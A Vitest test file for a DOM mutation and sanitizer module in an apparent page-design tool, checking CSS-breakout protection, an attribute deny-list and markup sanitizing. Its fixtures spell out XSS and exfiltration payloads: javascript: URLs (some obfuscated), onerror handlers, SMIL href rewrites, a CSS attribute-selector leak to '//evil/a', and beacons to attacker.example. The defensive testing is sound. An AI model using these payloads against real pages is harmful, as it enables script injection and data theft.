import { describe, expect, it } from 'vitest';
import { attrDenyReason, createMutator, MARKER_ATTR } from '@/dom/mutate';

const SHEET_ID = 'dz-designer-overrides';

function mount(html: string): void {
  document.documentElement.removeAttribute('style');
  document.head.innerHTML = '';
  document.body.innerHTML = html;
}

function byId(id: string): HTMLElement {
  const el = document.getElementById(id);
  if (!el) throw new Error(`fixture missing: #${id}`);
  return el;
}

// The overrides sheet is built through CSSOM (never string concatenation — #165 F1), so its
// `<style>` element carries NO text: read the rules back off the live stylesheet instead.
function sheetTextIn(root: Document | ShadowRoot): string {
  const style = root.getElementById(SHEET_ID);
  const sheet = style instanceof HTMLStyleElement ? style.sheet : null;
  return sheet ? Array.from(sheet.cssRules, (r) => r.cssText).join('\n') : '';
}

function sheetText(): string {
  return sheetTextIn(document);
}

describe('createMutator setStyle', () => {
  it('applies props via the injected sheet (never inline) and marks the element', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    createMutator(document).setStyle(el, { color: 'red', backgroundColor: 'blue' });

    const id = el.getAttribute(MARKER_ATTR);
    expect(id).toMatch(/^dz-\d+$/);
    expect(el.getAttribute('style')).toBeNull();
    expect(sheetText()).toContain(`[${MARKER_ATTR}="${id}"]`);
    expect(sheetText()).toContain('color: red !important');
    expect(sheetText()).toContain('background-color: blue !important'); // camelCase -> kebab
  });

  it('undo removes the rule and the marker', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    const mutation = createMutator(document).setStyle(el, { color: 'red' });
    mutation.undo();
    expect(el.hasAttribute(MARKER_ATTR)).toBe(false);
    expect(sheetText()).toBe('');
  });

  it('merges a second setStyle into one rule and unwinds to the first', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    const mutator = createMutator(document);
    mutator.setStyle(el, { color: 'red' });
    const second = mutator.setStyle(el, { color: 'green', fontSize: '20px' });

    expect(sheetText()).toContain('color: green !important');
    expect(sheetText()).toContain('font-size: 20px !important');

    second.undo();
    expect(sheetText()).toContain('color: red !important'); // reverts to the first value
    expect(sheetText()).not.toContain('font-size'); // the prop second added is dropped
    expect(el.hasAttribute(MARKER_ATTR)).toBe(true); // first override still active
  });

  it('reports the applied value as computed', () => {
    mount('<button id="cta">Buy</button>');
    const mutation = createMutator(document).setStyle(byId('cta'), { color: 'rgb(1, 2, 3)' });
    expect(mutation.computed.color).toBe('rgb(1, 2, 3)');
    expect(mutation.kind).toBe('setStyle');
    expect(mutation.ruleId).toMatch(/^dz-\d+$/);
  });

  // #165 F1: a value carrying `}` used to close our rule by string concatenation, so everything
  // after it landed as TOP-LEVEL page CSS (`* { background-image: url(https://attacker/...) }` —
  // a same-cookie remote fetch + a repaint-the-whole-page channel). Built through CSSOM the value
  // can't escape its own declaration.
  it('cannot break out of its rule through a value carrying CSS syntax', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    createMutator(document).setStyle(el, {
      color: 'red } * { background-image: url(https://attacker.example/p.png) } .z { color: blue',
      'font-size': '20px',
    });

    const style = document.getElementById(SHEET_ID);
    const sheet = style instanceof HTMLStyleElement ? style.sheet : null;
    // Exactly ONE rule, and it is ours — no smuggled `*` / `.z` block.
    expect(sheet?.cssRules).toHaveLength(1);
    const rule = sheet?.cssRules[0] as CSSStyleRule;
    expect(rule.selectorText).toBe(`[${MARKER_ATTR}="${el.getAttribute(MARKER_ATTR)}"]`);
    expect(sheetText()).not.toContain('attacker.example');
    expect(sheetText()).not.toContain('*');
    // The invalid declaration is dropped; the legitimate one in the same call still applies.
    expect(rule.style.getPropertyValue('color')).toBe('');
    expect(rule.style.getPropertyValue('font-size')).toBe('20px');
  });

  // #165 F1 correctness half: an unbalanced `{` used to swallow every FOLLOWING block, so other
  // elements' edits silently stopped rendering while the recorder still believed they were live.
  it('keeps a later element’s rule rendering after a syntax-bearing value', () => {
    mount('<button id="cta">Buy</button><p id="copy">hi</p>');
    const mutator = createMutator(document);
    mutator.setStyle(byId('cta'), { color: 'red { unbalanced' });
    mutator.setStyle(byId('copy'), { color: 'green' });
    expect(sheetText()).toContain('color: green !important');
  });

  // #165 F4: document CSS never crosses a shadow boundary, so a shadow-nested target gets its own
  // sheet INSIDE that root — a rule in the document sheet reports "applied" and paints nothing.
  // Asserted structurally: jsdom builds no CSSStyleSheet for a <style> inside a shadow root
  // (`style.sheet === null` there), so the rules themselves are only observable in a real browser.
  it('gives a shadow-nested target its own root’s sheet', () => {
    mount('<div id="host"></div>');
    const root = byId('host').attachShadow({ mode: 'open' });
    root.innerHTML = '<button id="buy">Buy</button>';
    const inner = root.getElementById('buy') as Element;

    createMutator(document).setStyle(inner, { color: 'red' });

    expect(root.getElementById(SHEET_ID)).toBeInstanceOf(HTMLStyleElement);
    expect(sheetText()).toBe(''); // nothing landed in the document sheet, where it could not apply
  });
});

describe('createMutator setText / setAttr', () => {
  it('setText replaces text and undo restores it', () => {
    mount('<p id="t">before</p>');
    const el = byId('t');
    const mutation = createMutator(document).setText(el, 'after');
    expect(el.textContent).toBe('after');
    expect(mutation.before).toBe('before');
    mutation.undo();
    expect(el.textContent).toBe('before');
  });

  it('setText round-trips child structure on undo (not just flattened text)', () => {
    mount('<p id="t">Hello <b>world</b><i>!</i></p>');
    const el = byId('t');
    const mutation = createMutator(document).setText(el, 'replaced');

    expect(el.textContent).toBe('replaced');
    expect(el.children).toHaveLength(0); // visible text replaced
    expect(mutation.before).toBe('Hello <b>world</b><i>!</i>'); // full markup captured, not lossy
    mutation.undo();
    expect(el.innerHTML).toBe('Hello <b>world</b><i>!</i>'); // structure restored, not collapsed
    expect(el.querySelector('b')?.textContent).toBe('world');
  });

  it('setAttr adds a new attribute and undo removes it', () => {
    mount('<a id="l">x</a>');
    const el = byId('l');
    const mutation = createMutator(document).setAttr(el, 'href', '/home');
    expect(el.getAttribute('href')).toBe('/home');
    mutation.undo();
    expect(el.hasAttribute('href')).toBe(false);
  });

  it('setAttr restores a prior attribute value on undo', () => {
    mount('<a id="l" href="/old">x</a>');
    const el = byId('l');
    const mutation = createMutator(document).setAttr(el, 'href', '/new');
    expect(el.getAttribute('href')).toBe('/new');
    mutation.undo();
    expect(el.getAttribute('href')).toBe('/old');
  });

  it('setAttr records the attribute name in the event (self-describing, like setStyle)', () => {
    mount('<a id="l" href="/old">x</a>');
    const m = createMutator(document).setAttr(byId('l'), 'href', '/new');
    // before/after carry the name so #9/#10 can reconstruct WHICH attribute changed, not just its value.
    expect(JSON.parse(m.before)).toEqual({ href: '/old' });
    expect(JSON.parse(m.after)).toEqual({ href: '/new' });
  });

  it('setAttr encodes an absent prior attribute as null', () => {
    mount('<a id="l">x</a>');
    const m = createMutator(document).setAttr(byId('l'), 'data-x', '1');
    expect(JSON.parse(m.before)).toEqual({ 'data-x': null });
    expect(JSON.parse(m.after)).toEqual({ 'data-x': '1' });
  });

  it('setAttr throws on a denied write and does not touch the DOM (safe at source)', () => {
    mount('<a id="l">x</a>');
    const el = byId('l');
    const mutator = createMutator(document);
    expect(() => mutator.setAttr(el, 'onclick', 'steal()')).toThrow(/event handler/);
    expect(() => mutator.setAttr(el, 'href', 'javascript:alert(1)')).toThrow(/javascript:/);
    expect(() => mutator.setAttr(el, 'src', 'https://cdn/x.js')).toThrow(/remote resource/);
    expect(el.hasAttribute('onclick')).toBe(false);
    expect(el.hasAttribute('src')).toBe(false);
    expect(el.hasAttribute('href')).toBe(false);
  });
});

describe('attrDenyReason (setAttr security deny-list)', () => {
  it('allows safe attribute writes', () => {
    expect(attrDenyReason('href', '/home')).toBeNull();
    expect(attrDenyReason('href', 'https://example.com')).toBeNull();
    expect(attrDenyReason('data-id', '42')).toBeNull(); // data-* is not the bare `data` attr
    expect(attrDenyReason('alt', 'a photo')).toBeNull();
    // `javascript:` is inert in a non-navigational attribute, so it must NOT false-refuse legit copy.
    expect(attrDenyReason('alt', 'JavaScript: The Good Parts')).toBeNull();
    expect(attrDenyReason('title', 'javascript: a language')).toBeNull();
    expect(attrDenyReason('title', 'javascript is a language')).toBeNull();
  });

  it('refuses on* event-handler attributes regardless of casing', () => {
    expect(attrDenyReason('onclick', 'x()')).toContain('event handler');
    expect(attrDenyReason('OnError', 'x()')).toContain('event handler');
    expect(attrDenyReason('onmouseover', 'x()')).toBeTruthy();
  });

  it('refuses the remote-load / framed-script attribute names outright', () => {
    expect(attrDenyReason('src', 'https://cdn.example/x.js')).toContain('remote resource');
    expect(attrDenyReason('SRC', '/local.png')).toBeTruthy(); // case-insensitive
    expect(attrDenyReason('srcset', 'https://cdn/x.png 2x')).toBeTruthy();
    expect(attrDenyReason('poster', 'https://cdn/p.png')).toBeTruthy();
    expect(attrDenyReason('ping', 'https://track/beacon')).toBeTruthy();
    expect(attrDenyReason('data', 'https://evil/x.html')).toBeTruthy(); // <object data> runs framed JS
    expect(attrDenyReason('srcdoc', '<script>x()</script>')).toContain('inject');
  });

  it('refuses writes to the internal setStyle marker', () => {
    expect(attrDenyReason(MARKER_ATTR, 'dz-99')).toContain('reserved');
  });

  it('refuses javascript: URLs in navigational attributes (whitespace/control-char tolerant)', () => {
    expect(attrDenyReason('href', 'javascript:alert(1)')).toContain('javascript:');
    expect(attrDenyReason('href', '  JavaScript:alert(1)')).toBeTruthy(); // leading ws + casing
    expect(attrDenyReason('href', 'java\tscript:alert(1)')).toBeTruthy(); // embedded control char
    expect(attrDenyReason('xlink:href', 'javascript:x')).toBeTruthy();
    expect(attrDenyReason('formaction', 'javascript:x')).toBeTruthy();
    expect(attrDenyReason('action', 'javascript:x')).toBeTruthy();
  });
});

describe('createMutator class toggles', () => {
  it('addClass adds a new class and undo removes it', () => {
    mount('<div id="d"></div>');
    const el = byId('d');
    const mutation = createMutator(document).addClass(el, 'hero');
    expect(el.classList.contains('hero')).toBe(true);
    mutation.undo();
    expect(el.classList.contains('hero')).toBe(false);
  });

  it('addClass undo keeps a class that already existed', () => {
    mount('<div id="d" class="hero"></div>');
    const el = byId('d');
    createMutator(document).addClass(el, 'hero').undo();
    expect(el.classList.contains('hero')).toBe(true);
  });

  it('removeClass removes a class and undo restores it', () => {
    mount('<div id="d" class="a b"></div>');
    const el = byId('d');
    const mutation = createMutator(document).removeClass(el, 'b');
    expect(el.classList.contains('b')).toBe(false);
    mutation.undo();
    expect(el.classList.contains('b')).toBe(true);
  });

  it('removeClass undo does not add a class that was never present', () => {
    mount('<div id="d" class="a"></div>');
    const el = byId('d');
    createMutator(document).removeClass(el, 'ghost').undo();
    expect(el.classList.contains('ghost')).toBe(false);
  });
});

describe('createMutator structural edits', () => {
  it('insertNode inserts and undo removes', () => {
    mount('<ul id="list"><li>one</li></ul>');
    const ref = byId('list');
    const mutation = createMutator(document).insertNode(ref, '<li>two</li>', 'beforeend');
    expect(ref.querySelectorAll('li')).toHaveLength(2);
    expect(mutation.computed.html).toBe('<li>two</li>');
    mutation.undo();
    expect(ref.querySelectorAll('li')).toHaveLength(1);
  });

  it('insertNode inserts EVERY top-level node and undo removes them all', () => {
    mount('<ul id="list"><li>one</li></ul>');
    const ref = byId('list');
    const mutation = createMutator(document).insertNode(
      ref,
      '<li>two</li><li>three</li>',
      'beforeend',
    );
    expect(ref.querySelectorAll('li')).toHaveLength(3); // both siblings inserted, not just the first
    expect(mutation.after).toBe('<li>two</li><li>three</li>'); // full set serialized
    mutation.undo();
    expect(ref.querySelectorAll('li')).toHaveLength(1);
  });

  it('insertNode inserts a bare text node without wrapping it in a span', () => {
    mount('<p id="p">Hi </p>');
    const ref = byId('p');
    const mutation = createMutator(document).insertNode(ref, 'there', 'beforeend');
    expect(ref.querySelector('span')).toBeNull(); // no phantom wrapper
    expect(ref.textContent).toBe('Hi there');
    mutation.undo();
    expect(ref.textContent).toBe('Hi ');
  });

  it('insertNode strips inline on* handlers from imported markup (CSP-safe)', () => {
    mount('<div id="host"></div>');
    const ref = byId('host');
    createMutator(document).insertNode(
      ref,
      '<img src="x" onerror="window.__pwned=1" onload="1">',
      'beforeend',
    );
    const img = ref.querySelector('img');
    expect(img?.hasAttribute('onerror')).toBe(false);
    expect(img?.hasAttribute('onload')).toBe(false);
    // Behavior changed deliberately (#58 review, MAJOR-1): the sanitizer now applies setAttr's
    // deny-list uniformly, so a remote-loading `src` is refused too — otherwise insertNode would
    // trivially bypass setAttr('src', …)'s refusal.
    expect(img?.getAttribute('src')).toBeNull();
  });

  it('moveNode relocates and undo restores the original position', () => {
    mount('<div id="a"><span id="s">x</span></div><div id="b"></div>');
    const [s, a, b] = [byId('s'), byId('a'), byId('b')];
    const mutation = createMutator(document).moveNode(s, b, 'beforeend');
    expect(b.contains(s)).toBe(true);
    expect(a.contains(s)).toBe(false);
    mutation.undo();
    expect(a.contains(s)).toBe(true);
    expect(b.contains(s)).toBe(false);
  });

  it('removeNode removes and undo re-inserts at the same spot', () => {
    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
    const list = byId('list');
    const mutation = createMutator(document).removeNode(byId('x'));
    expect(document.getElementById('x')).toBeNull();
    mutation.undo();
    expect(Array.from(list.querySelectorAll('li')).map((li) => li.id)).toEqual(['x', 'y']);
  });
});

describe('createMutator page ops', () => {
  it('injectCss appends a stylesheet and undo removes it', () => {
    mount('<div></div>');
    const mutation = createMutator(document).injectCss('.x{color:red}');
    expect(document.querySelectorAll('style.dz-designer-injected')).toHaveLength(1);
    mutation.undo();
    expect(document.querySelectorAll('style.dz-designer-injected')).toHaveLength(0);
  });

  it('setViewport constrains the document width and undo restores prior style', () => {
    mount('<div></div>');
    const root = document.documentElement;
    const mutation = createMutator(document).setViewport({ width: 375 });
    expect(root.style.getPropertyValue('max-width')).toBe('375px');
    expect(mutation.computed).toEqual({ width: 375, height: null });
    mutation.undo();
    expect(root.style.getPropertyValue('max-width')).toBe('');
  });
});

describe('createMutator structural undo anchors (#58)', () => {
  it('removeNode undo restores the SAME node object (identity, not an equal clone)', () => {
    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
    const x = byId('x');
    const mutation = createMutator(document).removeNode(x);
    mutation.undo();
    expect(document.getElementById('x')).toBe(x);
  });

  it('moveNode undo restores the original anchor with a same-tag sibling present (an index restore would fail)', () => {
    mount('<div id="a"><span id="one">1</span><span id="two">2</span></div><div id="b"></div>');
    const [one, two, a, b] = [byId('one'), byId('two'), byId('a'), byId('b')];
    const mutation = createMutator(document).moveNode(one, b, 'beforeend');
    expect(b.contains(one)).toBe(true);
    mutation.undo();
    expect(a.contains(one)).toBe(true);
    expect(one.nextSibling).toBe(two); // restored at the anchor, not "index 0"
  });
});

describe('insertNode markup sanitizer (#58 review)', () => {
  it('drops framed-document and document-hijack tags outright', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<p id="ok">ok</p><iframe src="https://evil.example"></iframe><object data="x"></object>' +
        '<embed src="x"><base href="https://evil.example/"><meta http-equiv="refresh" content="0">' +
        '<link rel="stylesheet" href="https://evil.example/x.css"><script>window.x=1</' +
        'script>',
      'beforeend',
    );
    expect(document.getElementById('ok')).not.toBeNull();
    for (const tag of ['iframe', 'object', 'embed', 'base', 'meta', 'link', 'script'])
      expect(document.querySelector(tag), tag).toBeNull();
  });

  it('runs every attribute through the setAttr deny-list (srcdoc/src/javascript:/marker all die)', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      `<a id="a" href="javascript:alert(1)" onclick="alert(2)" ${MARKER_ATTR}="dz-99">x</a>` +
        '<img id="i" src="https://evil.example/x.png" alt="pic">',
      'beforeend',
    );
    const a = document.getElementById('a');
    expect(a?.getAttribute('href')).toBeNull();
    expect(a?.getAttribute('onclick')).toBeNull();
    expect(a?.getAttribute(MARKER_ATTR)).toBeNull();
    // uniform with setAttr: plain remote loads are refused too — mockups are described, not hotlinked
    expect(document.getElementById('i')?.getAttribute('src')).toBeNull();
    expect(document.getElementById('i')?.getAttribute('alt')).toBe('pic');
  });

  it('sanitizes INSIDE nested <template> content (page JS could clone it live later)', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<template id="tpl"><span onclick="alert(1)">inner</span><iframe src="https://evil.example"></iframe></template>',
      'beforeend',
    );
    const tpl = document.getElementById('tpl') as HTMLTemplateElement;
    expect(tpl.content.querySelector('span')?.getAttribute('onclick')).toBeNull();
    expect(tpl.content.querySelector('iframe')).toBeNull();
  });
});

describe('structural undo under page churn (#58 review)', () => {
  it('removeNode undo throws honestly when the anchor sibling was churned away', () => {
    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
    const y = byId('y');
    const mutation = createMutator(document).removeNode(byId('x'));
    y.remove(); // page-side churn the recorder knows nothing about (SPA re-render)
    expect(() => mutation.undo()).toThrow(/original location changed/);
  });

  it('removeNode undo throws when the whole parent was detached (no silent invisible restore)', () => {
    mount('<section id="wrap"><ul id="list"><li id="x">x</li></ul></section>');
    const mutation = createMutator(document).removeNode(byId('x'));
    byId('wrap').remove(); // the parent is now in a detached subtree
    expect(() => mutation.undo()).toThrow(/original location changed/);
  });

  it('moveNode undo restores the anchor after a concurrent shift (the case an index restore fails)', () => {
    mount('<div id="a"><span id="one">1</span><span id="two">2</span></div><div id="b"></div>');
    const [one, two, a, b] = [byId('one'), byId('two'), byId('a'), byId('b')];
    const mutation = createMutator(document).moveNode(one, b, 'beforeend');
    // Unrecorded concurrent mutation: a NEW first child appears in the original parent. An
    // index-based restore would put #one before the NEW node; the anchor restore puts it before #two.
    a.insertBefore(document.createElement('span'), two);
    mutation.undo();
    expect(a.contains(one)).toBe(true);
    expect(one.nextSibling).toBe(two);
  });
});

describe('insertNode sanitizer residuals (#144 round-3 review)', () => {
  it('drops SMIL animation tags (they can rewrite href to javascript: AFTER insertion)', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<svg id="s" viewBox="0 0 10 10"><a href="?"><animate attributeName="href" values="javascript:alert(1)"/>' +
        '<set attributeName="href" to="javascript:alert(1)"/><circle r="2">' +
        '<animateMotion path="M0,0 L1,1"/><animateTransform attributeName="transform"/>' +
        '</circle></svg>',
      'beforeend',
    );
    const svg = document.getElementById('s');
    expect(svg).not.toBeNull(); // the SVG itself is legit design markup
    for (const tag of ['animate', 'set', 'animateMotion', 'animateTransform'])
      expect(svg?.querySelector(tag), tag).toBeNull();
  });

  it("drops <style> elements (page-wide CSS is beyond setStyle's scoped grant)", () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<p id="ok" style="color: red">ok</p><style>input[value^="a"]{background:url(//evil/a)}</style>',
      'beforeend',
    );
    expect(document.getElementById('ok')).not.toBeNull();
    expect(document.getElementById('ok')?.getAttribute('style')).toBe('color: red'); // inline style stays
    expect(document.querySelector('style')).toBeNull();
  });

  it('refuses remote http(s) href on SVG image/use, keeps data: and fragment refs', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<svg><image id="img" href="https://evil.example/beacon.png"/>' +
        '<image id="img2" href="data:image/png;base64,AAA"/>' +
        '<use id="u" href="#local-shape"/></svg>',
      'beforeend',
    );
    expect(document.getElementById('img')?.getAttribute('href')).toBeNull();
    expect(document.getElementById('img2')?.getAttribute('href')).toBe('data:image/png;base64,AAA');
    expect(document.getElementById('u')?.getAttribute('href')).toBe('#local-shape');
  });
});

describe('insertNode SVG href allowlist (#144 round-4 review)', () => {
  it('refuses protocol-relative, C0-obfuscated, tab-obfuscated, and feImage remote loads', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<svg><image id="a" href="//evil.example/beacon.png"/>' +
        '<image id="b" href="\x0Ehttps://evil.example/x"/>' +
        '<image id="c" href="h\ttps://evil.example/x"/>' +
        '<filter id="f"><feImage href="https://evil.example/y"/></filter></svg>',
      'beforeend',
    );
    expect(document.getElementById('a')?.getAttribute('href')).toBeNull();
    expect(document.getElementById('b')?.getAttribute('href')).toBeNull();
    expect(document.getElementById('c')?.getAttribute('href')).toBeNull();
    expect(document.querySelector('feImage')?.getAttribute('href')).toBeNull();
  });

  it('keeps same-document fragment refs and inline data:image/ on image/use', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<svg><use id="u" href="#shape"/><image id="i" href="data:image/png;base64,AAA"/></svg>',
      'beforeend',
    );
    expect(document.getElementById('u')?.getAttribute('href')).toBe('#shape');
    expect(document.getElementById('i')?.getAttribute('href')).toBe('data:image/png;base64,AAA');
  });
});

describe('legacy presentational background attribute (#144 round-4 review)', () => {
  it('attrDenyReason refuses background (an automatic remote load on table/body family)', () => {
    expect(attrDenyReason('background', 'https://evil.example/x')).toContain('remote resource');
  });

  it('insertNode strips the background attribute from inserted markup', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<table id="t" background="https://evil.example/x"><tr><td>cell</td></tr></table>',
      'beforeend',
    );
    expect(document.getElementById('t')?.getAttribute('background')).toBeNull();
    expect(document.getElementById('t')?.textContent).toContain('cell');
  });
});

describe('#9 typed mutation fields (recorder ground truth)', () => {
  it('setStyle carries styleChanges: the pre-mutation computed value as before, applied after', () => {
    mount('<button id="cta">Buy</button>');
    const mutation = createMutator(document).setStyle(byId('cta'), { color: 'rgb(1, 2, 3)' });
    // A real browser (and jsdom) always computes SOME color — here the canvas default black.
    // `before: null` is reserved for props with no computed value at all (e.g. unsupported).
    expect(mutation.styleChanges).toEqual([
      { prop: 'color', before: 'rgb(0, 0, 0)', after: 'rgb(1, 2, 3)' },
    ]);
  });

  it('setStyle records the page’s PRE-mutation computed value (inline style), not the override prior', () => {
    mount('<button id="cta" style="color: green">Buy</button>');
    const mutation = createMutator(document).setStyle(byId('cta'), { color: 'rgb(1, 2, 3)' });
    expect(mutation.styleChanges?.[0]?.prop).toBe('color');
    // getComputedStyle resolves color names to rgb (browsers and jsdom alike).
    expect(mutation.styleChanges?.[0]?.before).toBe('rgb(0, 128, 0)');
    expect(mutation.styleChanges?.[0]?.after).toBe('rgb(1, 2, 3)');
  });

  it('setStyle carries one styleChanges entry per touched prop', () => {
    mount('<button id="cta">Buy</button>');
    const mutation = createMutator(document).setStyle(byId('cta'), {
      color: 'rgb(1, 2, 3)',
      backgroundColor: 'blue',
    });
    expect(mutation.styleChanges?.map((c) => c.prop)).toEqual(['color', 'background-color']);
  });

  it('setText carries a textChange delta and bounds a long before to 2000 chars', () => {
    mount(`<p id="copy">${'lorem '.repeat(500)}</p>`);
    const mutation = createMutator(document).setText(byId('copy'), 'short');
    expect(mutation.textChange?.after).toBe('short');
    expect(mutation.textChange?.before).toHaveLength(2000);
    // The legacy opaque `before` stays the lossless innerHTML for undo.
    expect(mutation.before.length).toBeGreaterThan(2000);
  });

  it('setAttr carries attrChange (null before when the attribute was absent)', () => {
    mount('<button id="cta">Buy</button>');
    const added = createMutator(document).setAttr(byId('cta'), 'data-variant', 'brand');
    expect(added.attrChange).toEqual({ name: 'data-variant', before: null, after: 'brand' });

    mount('<button id="cta" data-variant="old">Buy</button>');
    const changed = createMutator(document).setAttr(byId('cta'), 'data-variant', 'brand');
    expect(changed.attrChange).toEqual({ name: 'data-variant', before: 'old', after: 'brand' });
  });

  it('addClass/removeClass carry the single classChange', () => {
    mount('<button id="cta" class="present">Buy</button>');
    const mutator = createMutator(document);
    expect(mutator.addClass(byId('cta'), 'btn-primary').classChange).toEqual({
      name: 'btn-primary',
      op: 'add',
    });
    expect(mutator.removeClass(byId('cta'), 'present').classChange).toEqual({
      name: 'present',
      op: 'remove',
    });
  });

  // #9 review fix: a no-op class toggle must emit NO delta at all — emitting one would make the
  // SW's class-fold window diff cancel a real op against a phantom. The field is genuinely
  // ABSENT (not undefined), same rule as ruleId.
  it('a no-op addClass (class already present) carries NO classChange', () => {
    mount('<button id="cta" class="present">Buy</button>');
    const mutation = createMutator(document).addClass(byId('cta'), 'present');
    expect(mutation.kind).toBe('addClass');
    expect('classChange' in mutation).toBe(false);
  });

  it('a no-op removeClass (class absent) carries NO classChange', () => {
    mount('<button id="cta" class="present">Buy</button>');
    const mutation = createMutator(document).removeClass(byId('cta'), 'ghost');
    expect(mutation.kind).toBe('removeClass');
    expect('classChange' in mutation).toBe(false);
  });

  // #9 round-2 review fix: styleChanges must not stamp UNAPPLIED values. An invalid declaration
  // is dropped by the CSS parser; the raw-input fallback used to record it as if it took. The
  // pair is now built from the fallback-free readback and dropped when the after reads empty.
  // (`gap` pins this in jsdom: it strictly validates the value and defaults to '' — unlike
  // color, whose UA default always computes non-empty.)
  it('setStyle drops an invalid declaration from styleChanges but keeps the valid prop', () => {
    mount('<button id="cta">Buy</button>');
    const mutation = createMutator(document).setStyle(byId('cta'), {
      gap: 'not-a-length', // parser drops the declaration → empty readback → pair dropped
      color: 'rgb(1, 2, 3)', // valid → recorded
    });
    expect(mutation.styleChanges).toEqual([
      { prop: 'color', before: 'rgb(0, 0, 0)', after: 'rgb(1, 2, 3)' },
    ]);
    // The model-facing `computed` readback KEEPS the raw-input fallback (pre-existing contract):
    // it reports the value the model just set, even when the parser dropped it.
    expect(mutation.computed).toEqual({ gap: 'not-a-length', color: 'rgb(1, 2, 3)' });
  });
});
